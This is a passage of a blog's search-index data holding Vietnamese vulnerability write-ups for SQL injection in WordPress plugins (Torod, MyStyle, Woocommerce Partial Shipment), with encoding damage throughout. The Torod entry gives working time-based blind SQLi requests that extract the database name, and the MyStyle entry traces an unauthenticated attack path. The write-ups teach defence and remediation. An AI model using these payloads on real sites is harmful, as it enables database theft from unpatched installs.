ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment tr∆∞·ªõc phi√™n b·∫£n 3.3, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Woocommerce Partial Shipment Plugin \u0026lt;= 3.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-48118/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48118\"\u003eCVE-2025-48118\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/wc-partial-shipment/advanced/\"\u003eWordPress Woocommerce Partial Shipment Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e:  v3.2(vul) v√† v3.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eWoocommerce Partial Shipment Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48118"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.9 Fixed in: \u0026lt;= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nVulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nüëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nSource: $_POST['country_id'] Sink: $wpdb-\u0026gt;get_results(\u0026quot;SELECT * FROM $table_name WHERE country_id = $country_id\u0026quot;) How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action\nwp_ajax_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities.\nNh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë\naction=wp_ajax_nopriv_get_regions_and_cities\u0026amp;country_id=payload_here: Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Torod Plugin \u0026lt;= 1.9 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-30936/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTorod\u003c/strong\u003e c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-30936\"\u003eCVE-2025-30936\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/torod/\"\u003eWordPress Torod Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFixed in\u003c/strong\u003e: \u0026lt;= N/A\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTorod\u003c/strong\u003e: v1.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-30936"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh 